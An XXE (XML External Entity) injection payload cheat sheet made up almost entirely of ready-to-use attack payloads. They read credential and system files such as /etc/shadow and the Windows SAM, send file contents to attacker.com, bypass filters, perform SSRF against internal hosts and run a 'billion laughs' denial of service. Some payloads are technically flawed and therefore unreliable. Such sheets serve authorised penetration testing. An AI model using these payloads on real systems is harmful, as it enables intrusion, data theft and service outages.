# XXE (XML External Entity Injection) Payload Cheat Sheet

This cheat sheet includes payloads and techniques to test for XXE vulnerabilities, which occur when XML input containing a reference to an external entity is parsed. **Note:** These payloads are strictly for educational and authorized testing purposes only.

---

## Contents

- [Basic XXE Payloads](#basic-xxe-payloads)
- [File Disclosure XXE Payloads](#file-disclosure-xxe-payloads)
- [Out-of-Band (OOB) XXE Payloads](#out-of-band-oob-xxe-payloads)
- [Exfiltrating Data via XXE](#exfiltrating-data-via-xxe)
- [XXE with Parameter Entities](#xxe-with-parameter-entities)
- [XXE Blind Injection Techniques](#xxe-blind-injection-techniques)
- [Bypassing XXE Protections](#bypassing-xxe-protections)
- [Advanced XXE Techniques](#advanced-xxe-techniques)

---

## Basic XXE Payloads

Basic XXE payloads leverage external entities to retrieve content of internal files, causing the application to disclose sensitive data.

```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```

---

## File Disclosure XXE Payloads

File disclosure payloads use entity references to include sensitive files within the XML structure.

### Linux Example

```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/shadow">]>
<root>&xxe;</root>
```

### Windows Example

```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///C:/Windows/system.ini">]>
<root>&xxe;</root>
```

### Windows SAM File

```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///C:/Windows/System32/config/SAM">]>
<root>&xxe;</root>
```

> **Note:** Accessing sensitive files may require elevated permissions.

---

## Out-of-Band (OOB) XXE Payloads

OOB XXE allows exfiltrating data to an attacker-controlled server by exploiting external entities.

### DNS-Based OOB

```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "http://attacker.com/?data=file:///etc/passwd">]>
<root>&xxe;</root>
```

### HTTP-Based OOB

```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "http://attacker.com/exfiltrate?data=file:///etc/passwd">]>
<root>&xxe;</root>
```

---

## Exfiltrating Data via XXE

XXE vulnerabilities can be leveraged to exfiltrate sensitive information. The payload below sends the contents of a sensitive file to an external server.

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
  <!ENTITY % exfil SYSTEM "http://attacker.com/?data=%xxe;">
]>
<root>&exfil;</root>
```

---

## XXE with Parameter Entities

Parameter entities can be used to define reusable entities in more complex XXE attacks.

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY exfil SYSTEM 'http://attacker.com/?data=%file;'>">
  %eval;
]>
<root>&exfil;</root>
```

> **Note:** Some XML parsers restrict parameter entities in certain contexts to prevent XXE attacks.

---

## XXE Blind Injection Techniques

Blind XXE relies on side effects like network interactions, as the data isn’t displayed in the application response.

### Blind XXE with Error-Based Feedback

Some XML parsers will throw errors if they cannot resolve external entities, revealing information indirectly.

```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY % xxe SYSTEM "file:///nonexistent_file">]>
<root>&xxe;</root>
```

### Using DNS Requests for Blind XXE

DNS exfiltration triggers a DNS lookup to the attacker’s server, confirming XXE vulnerability.

```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "http://attacker.com">]>
<root>&xxe;</root>
```

---

## Bypassing XXE Protections

Some applications limit entities or specific XML tags to mitigate XXE. Here are techniques to bypass such restrictions:

### Nested Entities

Attempting nested or recursive entities can sometimes evade simplistic checks.

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY x1 SYSTEM "file:///etc/passwd">
  <!ENTITY x2 "&x1;">
]>
<root>&x2;</root>
```

### Hexadecimal Encoding

Hexadecimal encoding of characters in file paths may bypass filters looking for typical keywords.

```xml
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file://%65%74%63%2F%70%61%73%73%77%64">]>
<root>&xxe;</root>
```

### Base64 Encoding via PHP Filters

If PHP is handling the XML, this payload uses PHP’s `php://filter` to encode output in Base64, potentially bypassing file content filters.

```xml
<!DOCTYPE root [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>
<root>&xxe;</root>
```

---

## Advanced XXE Techniques

### SSRF via XXE

Using XXE to trigger server-side requests to internal network resources can help perform SSRF (Server-Side Request Forgery).

```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "http://internal.service.local/admin">]>
<root>&xxe;</root>
```

### Injecting XML into SOAP Requests

SOAP APIs can be tested by injecting XXE payloads directly into SOAP envelopes.

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/hosts">
]>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header/>
  <soapenv:Body>
    <xxe>&xxe;</xxe>
  </soapenv:Body>
</soapenv:Envelope>
```

### Recursive Entity Expansion (Billion Laughs Attack)

This attack can lead to Denial of Service by expanding entities recursively.

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "LOL">
  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
]>
<root>&lol5;</root>
```

> **Warning**: This attack can cause the server to crash. Only test in controlled environments.

---

## Additional Notes

- **XXE Protections**: Many modern XML parsers have features that disable external entities by default. Look for misconfigured or custom parsers that may re-enable them.
- **Content-Length Limitations**: When attacking file inclusion, large files may be truncated based on response limits, so check server responses for size limits.

---

### License

This cheat sheet is open-sourced and can be used for ethical testing and research. Unauthorized or illegal testing is prohibited.

---
